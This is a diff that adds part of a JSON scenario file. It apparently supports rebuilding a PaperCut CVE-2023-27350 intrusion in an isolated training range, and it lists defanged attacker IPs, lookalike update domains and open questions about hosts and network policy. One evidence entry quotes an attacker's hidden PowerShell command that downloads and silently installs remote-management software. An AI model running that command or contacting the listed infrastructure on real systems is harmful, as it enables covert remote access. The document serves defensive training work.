+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-27",
+   "quote": "CVE-2023-27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-28",
+   "quote": "CVE-2023-\n       27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "14"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-29",
+   "quote": "CVE-2023-27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "15"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-30",
+   "quote": "CVE-2023-27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "16"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-31",
+   "quote": "102.130.112[.]157",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "37"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "102.130.112[.]157"
+  },
+  {
+   "id": "evidence-32",
+   "quote": "172.106.112[.]46",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "37"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "172.106.112[.]46"
+  },
+  {
+   "id": "evidence-33",
+   "quote": "176.97.76[.]163",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "37"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "176.97.76[.]163"
+  },
+  {
+   "id": "evidence-34",
+   "quote": "192.160.102[.]164",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "37"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "192.160.102[.]164"
+  },
+  {
+   "id": "evidence-35",
+   "quote": "194.87.82[.]7",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "38"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "194.87.82[.]7"
+  },
+  {
+   "id": "evidence-36",
+   "quote": "195.123.246[.]20",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "38"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "195.123.246[.]20"
+  },
+  {
+   "id": "evidence-37",
+   "quote": "198.50.191[.]95",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "38"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "198.50.191[.]95"
+  },
+  {
+   "id": "evidence-38",
+   "quote": "206.197.244[.]75",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "39"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "206.197.244[.]75"
+  },
+  {
+   "id": "evidence-39",
+   "quote": "216.122.175[.]114",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "39"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "216.122.175[.]114"
+  },
+  {
+   "id": "evidence-40",
+   "quote": "46.4.20[.]30",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "40"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "46.4.20[.]30"
+  },
+  {
+   "id": "evidence-41",
+   "quote": "5.188.206[.]14",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "5.188.206[.]14"
+  },
+  {
+   "id": "evidence-42",
+   "quote": "5.8.18[.]233",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "5.8.18[.]233"
+  },
+  {
+   "id": "evidence-43",
+   "quote": "5.8.18[.]240",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "5.8.18[.]240"
+  },
+  {
+   "id": "evidence-44",
+   "quote": "80.94.95[.]103",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "80.94.95[.]103"
+  },
+  {
+   "id": "evidence-45",
+   "quote": "89.105.216[.]106",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "89.105.216[.]106"
+  },
+  {
+   "id": "evidence-46",
+   "quote": "92.118.36[.]199",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "41"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "92.118.36[.]199"
+  },
+  {
+   "id": "evidence-47",
+   "quote": "http://192.184.35[.]216:443/",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "42"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "http://192.184.35[.]216:443/"
+  },
+  {
+   "id": "evidence-48",
+   "quote": "192.184.35[.]216",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "42"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "192.184.35[.]216"
+  },
+  {
+   "id": "evidence-49",
+   "quote": "anydeskupdate[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "anydeskupdate[.]com"
+  },
+  {
+   "id": "evidence-50",
+   "quote": "anydeskupdates[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "anydeskupdates[.]com"
+  },
+  {
+   "id": "evidence-51",
+   "quote": "ber6vjyb[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "ber6vjyb[.]com"
+  },
+  {
+   "id": "evidence-52",
+   "quote": "netviewremote[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "netviewremote[.]com"
+  },
+  {
+   "id": "evidence-53",
+   "quote": "study.abroad[.]ge",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "study.abroad[.]ge"
+  },
+  {
+   "id": "evidence-54",
+   "quote": "upd343.winserverupdates[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "upd343.winserverupdates[.]com"
+  },
+  {
+   "id": "evidence-55",
+   "quote": "upd488.windowservicecemter[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "upd488.windowservicecemter[.]com"
+  },
+  {
+   "id": "evidence-56",
+   "quote": "updateservicecenter[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "updateservicecenter[.]com"
+  },
+  {
+   "id": "evidence-57",
+   "quote": "windowcsupdates[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "windowcsupdates[.]com"
+  },
+  {
+   "id": "evidence-58",
+   "quote": "windowservicecemter[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "windowservicecemter[.]com"
+  },
+  {
+   "id": "evidence-59",
+   "quote": "windowservicecentar[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "windowservicecentar[.]com"
+  },
+  {
+   "id": "evidence-60",
+   "quote": "windowservicecenter[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "windowservicecenter[.]com"
+  },
+  {
+   "id": "evidence-61",
+   "quote": "winserverupdates[.]com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "winserverupdates[.]com"
+  },
+  {
+   "id": "evidence-62",
+   "quote": "github.com",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "48"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "github.com"
+  },
+  {
+   "id": "evidence-63",
+   "quote": "cmd /c “powershell.exe -nop -w hidden Launches powershell.exe in a hidden window without loading the user's PowerShell profile. Invoke-WebRequest ‘<url>/setup.msi’ Downloads setup.msi, saving it as setup.msi, in the current",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "46"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd /c “powershell.exe nop w hidden Launches powershell.exe in a hidden window without loading the user's PowerShell profile. Invoke WebRequest ‘<url>/setup.msi"
+  },
+  {
+   "id": "evidence-64",
+   "quote": "cmd /c “msiexec /i setup.msi /qn Installs legitimate Atera RMM software on the IntegratorLogin=<email_address> system silently, with the specified email CompanyId=1” address and company ID properties",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "46"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "cmd /c “msiexec /i setup.msi /qn Installs legitimate Atera RMM software on the IntegratorLogin=<email_address> system silently, with the specified email Company"
+  }
+ ],
+ "missing_items": [
+  {
+   "id": "missing-hosts-h1-os",
+   "field": "PaperCut server — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "PaperCut server 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h1 — PaperCut server",
+    "action:a1 — Exploit CVE-2023-27350 to bypass authentication and execute remote code",
+    "action:a2 — Access PaperCut server as administrator via SetupCompleted Java class authentication bypass",
+    "action:a3 — Execute remote code using PaperCut print scripting interface",
+    "action:a4 — Execute remote code using User/Group Sync interface living-off-the-land attack",
+    "action:a5 — Spawn child processes cmd.exe or powershell.exe with SYSTEM/root privileges"
+   ],
+   "suggestions": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）",
+    "其他 Windows 版本（請填確切版本）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "PaperCut server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-14",
+      "evidence-3",
+      "evidence-15",
+      "evidence-1",
+      "evidence-2",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-os-version",
+   "field": "PaperCut server — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "PaperCut server 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h1 — PaperCut server",
+    "action:a1 — Exploit CVE-2023-27350 to bypass authentication and execute remote code",
+    "action:a2 — Access PaperCut server as administrator via SetupCompleted Java class authentication bypass",
+    "action:a3 — Execute remote code using PaperCut print scripting interface",
+    "action:a4 — Execute remote code using User/Group Sync interface living-off-the-land attack",
+    "action:a5 — Spawn child processes cmd.exe or powershell.exe with SYSTEM/root privileges"
+   ],
+   "suggestions": [
+    "Windows Server 2019（確切 build 待確認）",
+    "Windows Server 2016（確切 build 待確認）",
+    "Windows Server 2022（確切 build 待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "PaperCut server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-14",
+      "evidence-3",
+      "evidence-15",
+      "evidence-1",
+      "evidence-2",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-network",
+   "field": "PaperCut server — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "PaperCut server 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h1 — PaperCut server",
+    "action:a1 — Exploit CVE-2023-27350 to bypass authentication and execute remote code",
+    "action:a2 — Access PaperCut server as administrator via SetupCompleted Java class authentication bypass",
+    "action:a3 — Execute remote code using PaperCut print scripting interface",
+    "action:a4 — Execute remote code using User/Group Sync interface living-off-the-land attack",
+    "action:a5 — Spawn child processes cmd.exe or powershell.exe with SYSTEM/root privileges"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "PaperCut server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-14",
+      "evidence-3",
+      "evidence-15",
+      "evidence-1",
+      "evidence-2",
+      "evidence-4",
+      "evidence-5",
+      "evidence-6",
+      "evidence-7",
+      "evidence-8"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os",
+   "field": "Victim systems — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Victim systems 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h2 — Victim systems",
+    "action:a3 — Execute remote code using PaperCut print scripting interface",
+    "action:a6 — Download and execute legitimate remote management and maintenance (RMM) software",
+    "action:a9 — Leave ransom notes demanding payment for decryption"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Victim systems",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-16",
+      "evidence-5",
+      "evidence-11",
+      "evidence-4"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os-version",
+   "field": "Victim systems — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Victim systems 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h2 — Victim systems",
+    "action:a3 — Execute remote code using PaperCut print scripting interface",
+    "action:a6 — Download and execute legitimate remote management and maintenance (RMM) software",
+    "action:a9 — Leave ransom notes demanding payment for decryption"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Victim systems",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-16",
+      "evidence-5",
+      "evidence-11",
+      "evidence-4"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-network",
+   "field": "Victim systems — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Victim systems 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h2 — Victim systems",
+    "action:a3 — Execute remote code using PaperCut print scripting interface",
+    "action:a6 — Download and execute legitimate remote management and maintenance (RMM) software",
+    "action:a9 — Leave ransom notes demanding payment for decryption"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Victim systems",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-16",
+      "evidence-5",
+      "evidence-11",
+      "evidence-4"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-service-s1-version",
+   "field": "PaperCut MF and NG — 版本",
+   "category": "version",
+   "reason": "IR 指出 PaperCut MF and NG（CVE-2023-27350），但沒有可重現所需的確切版本。",
+   "severity": "major",
+   "status": "open",
+   "question": "靶場要重建 PaperCut MF and NG 的哪個版本？請選受 CVE-2023-27350 影響的版本；原文沒有寫的話，請從資產清單核對或明確選擇替代版本，不要由產品名稱猜測。",
+   "affects": [
+    "service:s1 — PaperCut MF and NG",
+    "action:a1 — Exploit CVE-2023-27350 to bypass authentication and execute remote code"
+   ],
+   "suggestions": [
+    "填入來源或資產清單記載的確切版本",
+    "選用隔離靶場可取得的替代版本並標記為替代",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "受害軟體/服務",
+     "value": "PaperCut MF and NG",
+     "source_ref": "services:s1.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-17"
+     ]
+    },
+    {
+     "field": "相關漏洞",
+     "value": "CVE-2023-27350",
+     "source_ref": "services:s1.cve",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-17"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "services",
+    "id": "s1",
+    "field": "version"
+   }
+  },
+  {
+   "id": "missing-service-s3-configuration",
+   "field": "Print scripting interface — 靶場部署/連線設定",
+   "category": "dependency",
+   "reason": "a3, a6 使用 Print scripting interface，但 IR 沒有提供重建所需的服務設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "a3, a6 依賴 Print scripting interface。靶場中部署端點、連接埠、啟用狀態與允許來源要如何設定？請只提供隔離靶場資訊。",
+   "affects": [
+    "service:s3 — Print scripting interface",
+    "action:a3 — Execute remote code using PaperCut print scripting interface",
+    "action:a6 — Download and execute legitimate remote management and maintenance (RMM) software"
+   ],
+   "suggestions": [
+    "只在隔離網段開放必要連接埠",
+    "以來源明確記載的設定為準",
+    "保留未知並不部署此服務"
+   ],
+   "known": [
+    {
+     "field": "IR 服務線索",
+     "value": "Print scripting interface",
+     "source_ref": "services:s3.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-18",
+      "evidence-5"
+     ]
+    },
+    {
+     "field": "依賴此服務的步驟",
+     "value": "Execute remote code using PaperCut print scripting interface",
+     "source_ref": "actions:a3.name",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-4",
+      "evidence-5"
+     ]
+    },
+    {
+     "field": "依賴此服務的步驟",
+     "value": "Download and execute legitimate remote management and maintenance (RMM) software",
+     "source_ref": "actions:a6.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-5"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "services",
+    "id": "s3",
+    "field": "configuration"
+   }
+  },
+  {
+   "id": "missing-network-outbound-policy",
+   "field": "下載/C2 步驟的對外連線政策",
+   "category": "network",
+   "reason": "多個具名步驟需要下載檔案或建立 Ngrok/C2 連線，但 IR 沒有說明靶場允許哪些外連。",
+   "severity": "major",
+   "status": "open",
+   "question": "a6, a8 涉及下載、上傳或 Ngrok/C2。靶場是否完全封鎖外連、只接 sinkhole/模擬服務，或僅允許原文列出的目的地？請指定封鎖/允許規則；不要直接開放任意網際網路。",
+   "affects": [
+    "action:a6 — Download and execute legitimate remote management and maintenance (RMM) software",
+    "action:a8 — Download and execute command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons"
+   ],
+   "suggestions": [
+    "封鎖對外連線（隔離預設）",
+    "只允許連到指定 sinkhole/模擬服務",
+    "只允許報告列出的目的地（需確認隔離規則）"
+   ],
+   "known": [
+    {
+     "field": "需要外連的步驟",
+     "value": "Download and execute legitimate remote management and maintenance (RMM) software",
+     "source_ref": "actions:a6.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-5"
+     ]
+    },
+    {
+     "field": "需要外連的步驟",
+     "value": "Download and execute command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons",
+     "source_ref": "actions:a8.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-10"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "planner_dep_software-papercut-mf-and-ng-8-0-0-to",
+   "field": "software dependency: PaperCut MF and NG 8.0.0 to 19.2.7, 20.0.0 to 20.1.6, 21.0.0 to 21.2.10, 22.0.0 to 22.0.8",
+   "category": "software",
+   "reason": "PaperCut MF and NG is not in the inventory and no substitute matches; not reproducible. Named CVE(s) CVE-2023-27350 are not reproducible by any inventory component.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s1",
+   "question": "目錄沒有可部署的 PaperCut MF and NG。要用哪個元件當教學替代？也可以選擇不部署並保留為未重現。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-pc-app-exe-process",
+   "field": "software dependency: pc-app.exe process",
+   "category": "software",
+   "reason": "pc-app.exe process is not in the inventory and no substitute matches; not reproducible.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s2",
+   "question": "目錄沒有可部署的 pc-app.exe process。要用哪個元件當教學替代？也可以選擇不部署並保留為未重現。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-print-scripting-interface",
+   "field": "software dependency: Print scripting interface",
+   "category": "software",
+   "reason": "Print scripting interface is not in the inventory and no substitute matches; not reproducible.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s3",
+   "question": "目錄沒有可部署的 Print scripting interface。要用哪個元件當教學替代？也可以選擇不部署並保留為未重現。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  },
+  {
+   "id": "planner_dep_software-user-group-sync-interface",
+   "field": "software dependency: User/Group Sync interface",
+   "category": "software",
+   "reason": "User/Group Sync interface is not in the inventory and no substitute matches; not reproducible.",
+   "severity": "major",
+   "status": "open",
+   "service_ref": "s4",
+   "question": "目錄沒有可部署的 User/Group Sync interface。要用哪個元件當教學替代？也可以選擇不部署並保留為未重現。",
+   "suggestions": [
+    "不部署；此軟體相關步驟標記為未重現"
+   ]
+  }
+ ],
+ "quality": {
+  "quote_verified_rate": 0.8906,
+  "unsupported_claim_count": 11,
+  "inferred_count": 3,
+  "absent_count": 0,
+  "method": "single_pass",
+  "provisional": true,
+  "dropped_placeholder_hosts": 0,
+  "excluded_non_attacker_actions": [],
+  "hedged_action_count": 0,
+  "capability_action_count": 0,
+  "dropped_non_software_services": [],
+  "dropped_misplaced_techniques": []
+ },
+ "id": "scn_evidence",
+ "fidelity": "not_reproducible"
+}
